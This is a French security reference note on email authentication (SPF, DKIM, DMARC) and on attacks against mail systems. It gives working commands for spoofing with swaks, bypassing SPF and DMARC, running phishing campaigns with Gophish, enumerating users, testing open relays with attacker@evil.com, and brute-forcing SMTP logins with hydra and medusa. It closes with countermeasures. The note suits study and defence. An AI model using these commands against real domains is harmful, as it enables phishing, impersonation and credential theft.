---
title: SMTP et Email Attacks
domain: sciences-appliquées
subdomain: informatique / sécurité
tags: [smtp, email, spf, dkim, dmarc, spoofing, phishing, sécurité]
date: 2026-03-22
---

# SMTP et Email Attacks

## Protocoles d'authentification email

### SPF (Sender Policy Framework)

SPF définit quels serveurs sont autorisés à envoyer des emails au nom d'un domaine.

```bash
# Vérifier le SPF d'un domaine
dig TXT example.com | grep "v=spf1"
# Exemple : "v=spf1 include:sendgrid.net ip4:93.184.216.0/24 ~all"

Mécanismes :
  ip4:1.2.3.4      → Autoriser cette IP
  ip6:2001::/32    → Autoriser cette plage IPv6
  include:domain   → Inclure le SPF d'un autre domaine
  a                → Autoriser l'IP du champ A du domaine
  mx               → Autoriser les serveurs MX
  all              → Tout le reste

Qualificateurs :
  +all  → Tout est autorisé (dangereux — ne jamais utiliser)
  ~all  → SoftFail — email autorisé mais marqué (courant)
  -all  → HardFail — email rejeté (recommandé)
  ?all  → Neutre — aucune politique
```

### DKIM (DomainKeys Identified Mail)

DKIM signe cryptographiquement les emails pour garantir leur intégrité.

```bash
# Vérifier les clés DKIM publiées
dig TXT selector1._domainkey.example.com
# Exemple : "v=DKIM1; k=rsa; p=MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8A..."

# L'email signé contient un header DKIM-Signature
# DKIM-Signature: v=1; a=rsa-sha256; d=example.com; s=selector1; ...
```

### DMARC (Domain-based Message Authentication)

DMARC définit la politique à appliquer en cas d'échec SPF ou DKIM.

```bash
# Vérifier DMARC
dig TXT _dmarc.example.com
# Exemple : "v=DMARC1; p=reject; rua=mailto:dmarc@example.com; pct=100"

Politiques :
  p=none      → Surveiller sans action (souvent point de départ)
  p=quarantine → Envoyer en spam si échec
  p=reject    → Rejeter si échec SPF et DKIM (le plus sécurisé)

Rapport agrégé (rua) : résumé quotidien des emails traités
Rapport forensique (ruf) : détails sur les échecs
```

## Attaques d'usurpation (Spoofing)

### Spoofing si SPF/DKIM/DMARC absent ou mal configuré

```bash
# Vérifier les protections d'un domaine cible
python3 -c "
import dns.resolver
domain = 'target.com'

# SPF
try:
    for r in dns.resolver.resolve(domain, 'TXT'):
        if 'v=spf1' in str(r): print('SPF:', r)
except: print('SPF: ABSENT')

# DMARC
try:
    for r in dns.resolver.resolve(f'_dmarc.{domain}', 'TXT'):
        print('DMARC:', r)
except: print('DMARC: ABSENT')
"

# Tester la capacité à spoofer (avec un open relay ou un VPS)
swaks --to victime@target.com \
      --from admin@target.com \
      --server mail.target.com \
      --body "Test de spoofing"
```

### Bypass SPF — techniques

```bash
# 1. Sous-domaine non protégé
# Si target.com a SPF/DMARC → tester info@mail.target.com (sous-domaine sans SPF)
# DMARC sans aspf=s → l'alignement est relaxed → info@mail.target.com passe

# 2. SPF +all ou ~all
# Si SPF finit par ~all → SoftFail → souvent accepté quand même

# 3. Domaines similaires (lookalike)
# target.com → target-security.com, targêt.com (IDN), target.com.phish.net

# 4. Via un service légitime mal configuré
# Si target.com utilise SendGrid → et que l'API est accessible → envoyer depuis target.com
# Les serveurs de SendGrid sont dans le SPF → email passe

# 5. Subdomain spoofing
# DMARC p=reject sur example.com → tenter mail@subdomain.example.com
# Si _dmarc.subdomain.example.com n'existe pas → pas de DMARC → email possible
```

### Infrastructure de phishing

```bash
# Gophish — framework de phishing open-source
# Installation
wget https://github.com/gophish/gophish/releases/latest/download/gophish-linux-amd64.zip
unzip gophish-linux-amd64.zip && ./gophish
# Interface web : https://localhost:3333

# Fonctionnalités :
# - Campagnes d'emails avec tracking d'ouverture
# - Pages de phishing (clones de pages légitimes)
# - Suivi des clicks et des credentials soumis
# - Rapports par campagne

# Evilginx2 — reverse proxy pour vol de sessions (bypass MFA)
# Intercepte les cookies de session après authentification réelle
```

## SMTP — Énumération et accès

```bash
# Connexion SMTP manuelle (port 25, 465/587 avec TLS)
nc target.com 25
telnet target.com 25

# Commandes SMTP de base
EHLO attacker.com           # Saluer le serveur (Extended HELO)
MAIL FROM:<sender@test.com> # Expéditeur
RCPT TO:<user@target.com>   # Destinataire
DATA                        # Début du message
Subject: Test\r\n\r\nBody   # En-têtes + corps
.                           # Fin du message
QUIT

# Vérification d'existance d'utilisateurs (VRFY/EXPN)
VRFY alice                  # Vérifier si alice existe
EXPN mailing-list           # Expander une liste de diffusion
# (souvent désactivé en production)

# Énumération via RCPT TO (bounce ou pas = utilisateur existe ou non)
# swaks — couteau suisse SMTP
swaks --to alice@target.com --server mail.target.com --quit-after RCPT
```

### Open Relay

```bash
# Un open relay accepte des emails pour n'importe quel domaine (misconfiguration)
# Tester si un serveur est un open relay
swaks --to external@gmail.com \
      --from attacker@evil.com \
      --server mail.target.com
# Si accepté → open relay → utilisable pour du spam ou du phishing

# Scanner avec nmap
nmap -p 25 --script smtp-open-relay target.com
```

### Brute-force SMTP

```bash
# Tester des credentials sur un serveur SMTP authentifié
hydra -l admin -P rockyou.txt smtp://mail.target.com:587 -v
medusa -u admin -P rockyou.txt -h mail.target.com -M smtp -n 587

# Format d'auth SMTP (AUTH LOGIN ou AUTH PLAIN)
# AUTH PLAIN : base64("user\0user\0password")
python3 -c "import base64; print(base64.b64encode(b'\x00admin\x00password').decode())"
```

## Analyse d'en-têtes email

```
Les en-têtes Received: montrent le chemin parcouru par l'email (de bas en haut)

Received: from mail.attacker.com (mail.attacker.com [1.2.3.4])
        by mx.target.com with ESMTP id xxx
        for <victim@target.com>; Mon, 1 Jan 2026 12:00:00 +0000

Authentication-Results: mx.target.com;
    spf=pass smtp.mailfrom=sender@legit.com;
    dkim=pass header.d=legit.com;
    dmarc=pass action=none header.from=legit.com

X-Originating-IP: 1.2.3.4   ← IP réelle de l'expéditeur (si non masquée)

# Analyser des en-têtes
# https://mxtoolbox.com/emailheaders.aspx
# https://toolbox.googleapps.com/apps/messageheader/

# Vérifier SPF/DKIM/DMARC via CLI
swaks --to test@gmail.com --from spoofed@target.com --server localhost
```

## Contre-mesures

```
Configuration d'un domaine sécurisé :
✓ SPF : "v=spf1 include:authorized-servers.com -all" (HardFail)
✓ DKIM : clés RSA 2048 bits minimum, rotation annuelle
✓ DMARC : commencer par p=none → surveiller → migrer vers p=reject
   "v=DMARC1; p=reject; rua=mailto:dmarc@domain.com; pct=100; aspf=s; adkim=s"
   aspf=s et adkim=s → alignement strict (le sous-domaine doit correspondre exactement)
✓ MTA-STS : forcer TLS pour les connexions SMTP entrants
✓ BIMI : logo de marque dans les clients email (requiert DMARC p=quarantine/reject)

Anti-phishing :
✓ Filtrage des emails entrants (SPF/DKIM/DMARC + réputation IP)
✓ Sandboxing des pièces jointes
✓ Formation des utilisateurs (simulations de phishing avec Gophish)
✓ Signalement facile des emails suspects (bouton dans le client email)

Désactiver VRFY et EXPN sur les serveurs SMTP (Postfix) :
  disable_vrfy_command = yes
```
